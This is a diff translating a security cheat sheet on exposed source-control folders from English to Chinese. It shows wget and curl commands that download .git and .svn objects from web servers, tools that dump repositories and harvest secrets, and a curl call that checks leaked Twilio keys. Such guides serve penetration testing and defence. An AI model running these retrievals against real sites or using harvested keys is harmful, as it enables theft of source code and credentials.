@@ -1,28 +1,28 @@
-# Insecure source code management
+# 不安全的代码管理
 
 - [GIT - Source code management](#git---source-code-management)
-  - [Github example with a .git](#github-example-with-a-git)
-  - [Recovering the content of .git/index](#recovering-the-content-of-gitindex)
-  - [Automatic way : diggit.py](#automatic-way--diggitpy)
-  - [Automatic way : GoGitDumper](#automatic-way-gogitdumper)
-  - [Automatic way : rip-git](#automatic-way--rip-git)
-  - [Automatic way : GitHack](#automatic-way--githack)
-  - [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
-  - [Harvesting secrets : Gitrob](#harvesting-secrets--gitrob)
-  - [Harvesting secrets : Gitleaks](#harvesting-secrets--gitleaks)
+	- [Github example with a .git](#github-example-with-a-git)
+	- [Recovering the content of .git/index](#recovering-the-content-of-gitindex)
+	- [Automatic way : diggit.py](#automatic-way--diggitpy)
+	- [Automatic way : GoGitDumper](#automatic-way-gogitdumper)
+	- [Automatic way : rip-git](#automatic-way--rip-git)
+	- [Automatic way : GitHack](#automatic-way--githack)
+	- [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
+	- [Harvesting secrets : Gitrob](#harvesting-secrets--gitrob)
+	- [Harvesting secrets : Gitleaks](#harvesting-secrets--gitleaks)
 - [SVN - Source code management](#svn---source-code-management)
-  - [SVN example (Wordpress)](#svn-example-wordpress)
-  - [Automatic way : svn-extractor](#automatic-way--svn-extractor)
+	- [SVN example (Wordpress)](#svn-example-wordpress)
+	- [Automatic way : svn-extractor](#automatic-way--svn-extractor)
 - [BAZAAR - Source code management](#bazaar---source-code-management)
-  - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
-  - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
+	- [Automatic way : rip-bzr](#automatic-way--rip-bzr)
+	- [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
 - [Leaked API keys](#leaked-api-keys)
 
 ## GIT - Source code management
 
-The following examples will create either a copy of the .git or a copy of the current commit.
+以下示例将创建.git的副本或者是当前提交的副本
 
-Check for the following files, if they exist you can extract the .git folder.
+检查以下文件，如果存在，则可以解压缩出.git文件夹.
 
 - .git/config
 - .git/HEAD
@@ -30,64 +30,73 @@ Check for the following files, if they exist you can extract the .git folder.
 
 ### Github example with a .git
 
-1. Check 403 error (Forbidden) for .git or even better : a directory listing
-2. Git saves all informations in log file .git/logs/HEAD (try 'head' in lowercase too)
-    ```powershell
-    0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
-    15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
-    26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
-    6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
-    ```
-3. Access to the commit based on the hash -> a directory name (first two signs from hash) and filename (rest of it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
-    ```powershell
-    # create a .git directory
-    git init test
-    cd test/.git
+1. 检查是否在访问.git时存在403 error (Forbidden)或者存在目录
+2. Git保存了所有信息在日志文件.git/logs/HEAD (尝试小写字母head)
 
-    # download the file
-    wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
-    mkdir .git/object/26
-    mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+```powershell
+0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
+15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
+26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
+6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
+```
 
-    # display the content of the file
-    git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
-        tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-        parent 15ca375e54f056a576905b41a417b413c57df6eb
-        author Michael <michael@easyctf.com> 1489390329 +0000
-        committer Michael <michael@easyctf.com> 1489390329 +0000
-        Initial.
-    ```
-4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-    ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
-    mkdir .git/object/32
-    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
+1. 根据hash -> 目录名称(hash的前两个符号)和文件名(剩下的hash).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
 
-    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
-        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
-        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
-        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
-        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
-        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
-    ```
-5. Read the data (flag.txt)
-    ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
-    mkdir .git/object/cb
-    mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
-    git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
-    ```
+```powershell
+# create a .git directory
+git init test
+cd test/.git
+
+# download the file
+wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+mkdir .git/object/26
+mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+
+# display the content of the file
+git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
+    tree 323240a3983045cdc0dec2e88c1358e7998f2e39
+    parent 15ca375e54f056a576905b41a417b413c57df6eb
+    author Michael <michael@easyctf.com> 1489390329 +0000
+    committer Michael <michael@easyctf.com> 1489390329 +0000
+    Initial.
+```
+
+2. 访问树 323240a3983045cdc0dec2e88c1358e7998f2e39
+
+```powershell
+wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
+mkdir .git/object/32
+mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
+
+git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
+    040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
+    100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
+    040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
+    100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
+    040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
+```
+
+3. 读数据 (flag.txt)
+
+```powershell
+wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
+mkdir .git/object/cb
+mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
+git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
+```
 
 ### Recovering the content of .git/index
 
-Use the git index file parser, using python3 https://pypi.python.org/pypi/gin
+恢复.git/index的内容
+
+使用git index文件解析器，需要用到Python3https://pypi.python.org/pypi/gin
 
 ```powershell
 pip3 install gin
 gin ~/git-repo/.git/index
 ```
 
-Recover name and sha1 hash for each files listed in the index, allowing us to re-use the previous method on the file.
+恢复罗列在index文件上的每个文件的名字和对应的sha1，允许我们在文件上重用之前的方法。
 
 ```powershell
 $ gin .git/index | egrep -e "name|sha1" 
@@ -97,10 +106,12 @@ sha1 = 862a3e58d138d6809405aa062249487bee074b98
 name = CRLF injection/README.md
 sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 ```
- 
+
 
 
 ### Automatic way : diggit.py
+
+自动化工具
 
 ```powershell
 ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
@@ -143,7 +154,7 @@ GitHack.py http://www.openssl.org/.git/
 
 ### Harvesting secrets : trufflehog
 
-> Searches through git repositories for high entropy strings and secrets, digging deep into commit history
+> 在git仓库中搜索高匹配度的字符串，深入查找之前提交历史
 
 ```powershell
 pip install truffleHog # https://github.com/dxa4481/truffleHog
@@ -152,7 +163,7 @@ truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
 
 ### Harvesting secrets : Gitrob
 
-> Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.
+> Gitrob是一个可以帮助我们查找已经提交到Github公共仓库里潜在铭感文件的工具。Gitrob可以配置搜索深度，并把属于这个用户或者组织的仓库克隆下来，并遍历所有提交历史记录和标记文件，这些文件可能与敏感文件的签名匹配。
 
 ```powershell
 go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
@@ -162,7 +173,7 @@ gitrob [options] target [target2] ... [targetN]
 
 ### Harvesting secrets - Gitleaks
 
-> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.
+> Gitleaks提供了查找在git代码仓库中未加密的机密和其他已经不需要的数据
 
 ```powershell
 # Run gitleaks against a public repository
@@ -187,15 +198,18 @@ go get -u github.com/zricethezav/gitleaks
 curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 ```
 
-1. Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
-    ```powershell
-    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
-    ```
-2. Download interesting files
-    * remove \$sha1\$ prefix
-    * add .svn-base postfix
-    * use first two signs from hash as folder name inside pristine/ directory (94 in this case)
-    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
+1. 从 http://server/path_to_vulnerable_site/.svn/wc.db下载svn数据库
+
+	```powershell
+	INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
+	```
+
+2. 下载有趣的东西
+
+	* 删除 \$sha1\$ prefix
+	* 添加 .svn-base 后缀
+	* 使用hash中的前两个符号作为pristine /目录中的文件夹名称（本例中为94）
+	* 创建完整路径，比如: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
 ### Automatic way : svn-extractor
 
@@ -240,9 +254,9 @@ $ bzr revert
 
 ## Leaked API keys
 
-If you find any key , use the [keyhacks](https://github.com/streaak/keyhacks) from @streaak to verifiy them.
+如果找到任何密钥，可以使用@streaak 的项目https://github.com/streaak/keyhacks去验证.
 
-Twilio example :
+Twilio 示例 :
 
 ```powershell
 curl -X GET 'https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Keys.json' -u ACCOUNT_SID:AUTH_TOKEN
